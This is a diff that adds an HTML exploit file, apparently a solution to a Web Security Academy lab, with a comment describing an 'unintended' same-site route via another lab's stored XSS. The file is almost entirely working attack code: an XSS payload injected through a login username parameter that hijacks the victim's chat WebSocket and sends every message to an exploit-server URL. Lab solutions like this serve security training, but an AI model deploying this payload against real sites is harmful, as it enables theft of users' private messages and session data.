@@ -1,0 +1,25 @@
+<!-- Unintended solution:
+Start the lab "Stored XSS into HTML context with nothing encoded" at the same time.
+Post a comment with sthe same XSS payload as below.
+For the exploit, simply redirect the victim to the page with the stored XSS.
+Since the two labs are same-site, the cookies will be sent. -->
+
+<script>
+    var xss = `
+    <script>
+        var ws = new WebSocket('wss://....web-security-academy.net/chat');
+
+        ws.onopen = (event) => {
+            ws.send('READY');
+        }
+
+        ws.onmessage = (event) => {
+            fetch(\`https://exploit-....exploit-server.net/log/\${event.data}\`, {
+                mode: 'no-cors'
+            });
+        }
+    <\/script>
+    `;
+
+    window.location = `https://cms-....web-security-academy.net/login?username=${encodeURIComponent(xss)}&password=`;
+</script>
